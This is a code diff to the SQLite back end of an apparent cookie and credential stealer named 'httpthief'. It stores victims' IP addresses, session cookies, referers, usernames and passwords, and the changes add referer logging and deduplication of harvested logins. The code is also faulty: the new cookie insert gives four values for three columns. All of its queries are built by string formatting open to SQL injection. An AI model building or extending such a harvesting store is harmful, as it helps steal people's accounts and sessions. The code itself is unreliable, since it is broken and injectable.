@@ -2,7 +2,7 @@ import sqlite3, datetime
 
 class DB():
     def __init__(self):
-        self.dbpath = "t:\\test.db" #NAME OF THE DATABASE FILE (PATH IS OPTIONAL)
+        self.dbpath = "httpthief.db" #NAME OF THE DATABASE FILE (PATH IS OPTIONAL)
         self.dbcon = self.create_db(self.dbpath)
     def __repr__(self):
         return "SQLITE obj: " + self.dbpath
@@ -12,7 +12,7 @@ class DB():
         connection=sqlite3.connect(db)
         cur=connection.cursor()
         try:
-            cur.execute('CREATE TABLE cookie (Id INTEGER PRIMARY KEY, Date TEXT, Clientip TEXT, Data TEXT)')
+            cur.execute('CREATE TABLE cookie (Id INTEGER PRIMARY KEY, Date TEXT, Clientip TEXT, Data TEXT, Referer TEXT)')
             cur.execute('CREATE TABLE cred (Id INTEGER PRIMARY KEY, Date TEXT, Clientip TEXT, Username TEXT, Password TEXT)')
             connection.commit()
         except sqlite3.OperationalError:
@@ -25,14 +25,20 @@ class DB():
         cur.execute(query)
         self.db().commit()
         return cur.fetchall()
-    def insert_cookie(self, client_ip, data):
+    def insert_cookie(self, client_ip, data, referer):
         date = self.now()
-        query = 'INSERT INTO cookie(Date, Clientip, Data) VALUES("%s", "%s", "%s")' % (date, client_ip, data)
+        query = 'INSERT INTO cookie(Date, Clientip, Data) VALUES("%s", "%s", "%s", "%s")' % (date, client_ip, data, referer)
         self.execute_query(query)
     def insert_cred(self, client_ip, username, password):
         date = self.now()
-        query = 'INSERT INTO cred(Date, Clientip, Username, Password) VALUES("%s", "%s", "%s", "%s")' % (date, client_ip, username, password)
-        self.execute_query(query)
+        if self.select_cred(username, password):
+            "already exists, skipping"
+        else:
+            query = 'INSERT INTO cred(Date, Clientip, Username, Password) VALUES("%s", "%s", "%s", "%s")' % (date, client_ip, username, password)
+            self.execute_query(query)
+    def select_cred(self, username, password):
+        query = 'SELECT username, password FROM cred WHERE username = "%s" AND password = "%s"' % (username, password)
+        return self.execute_query(query)
     def dump_table(self, table):
         "should be used as a debug"
         query = 'SELECT * FROM %s' % table
